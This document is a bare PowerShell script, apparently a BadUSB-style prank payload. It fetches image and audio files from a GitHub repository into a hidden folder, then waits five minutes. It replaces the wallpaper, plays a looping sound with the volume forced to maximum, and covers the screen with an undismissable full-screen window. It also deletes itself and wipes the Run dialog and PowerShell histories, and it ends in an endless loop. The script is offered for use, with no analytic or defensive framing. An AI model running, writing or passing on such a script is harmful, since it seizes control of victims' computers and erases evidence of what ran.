iwr "https://raw.githubusercontent.com/Noshbit/black/main/w.jpg" -outfile "$env:USERPROFILE\temp\w.jpg"
iwr "https://raw.githubusercontent.com/Noshbit/black/main/f.png" -outfile "$env:USERPROFILE\temp\f.png"
iwr "https://raw.githubusercontent.com/Noshbit/black/main/s.wav" -outfile "$env:USERPROFILE\temp\s.wav"
attrib +s +h "$env:USERPROFILE\temp";

Function Set-SpeakerVolume
{ Param (
  [switch]$min,
  [switch]$max)
  $wshShell = new-object -com wscript.shell
  If ($min)
  {1..50 | % {$wshShell.SendKeys([char]174)}}
  ElseIf ($max)
  {1..50 | % {$wshShell.SendKeys([char]175)}}
  Else
  {$wshShell.SendKeys([char]173)} }
  

sleep 300;

sp 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\w.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden;};

Set-SpeakerVolume -Max

$player = New-Object System.Media.SoundPlayer "$env:USERPROFILE\temp\s.wav"
$player.PlayLooping();

Add-Type -AssemblyName system.windows.Forms
$user = $env:USERNAME
$computer = $env:COMPUTERNAME
$Form = New-Object system.windows.forms.form
$form.TopMost = $true
$Image = [system.drawing.image]::FromFile("$env:USERPROFILE\temp\f.png")
$Form.BackgroundImage = $Image
$Form.BackgroundImageLayout = "Zoom"
$Form.ShowInTaskbar = $false;
$Form.BackColor = "#000000"
$Form.WindowState = 'Maximized'
$Form.MinimizeBox = $False
$Form.ControlBox = $False
$Form.ShowInTaskbar = $False
$Form.FormBorderStyle = 'None'
$Form.MaximizeBox = $False

$Form.Show();

rm "$env:userprofile\temp\1.ps1";

Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue;

$pshist = Get-PSReadlineOption | select -expand historysavepath; rm $pshist;

WHILE ($TRUE) {
	Set-SpeakerVolume -Max
}
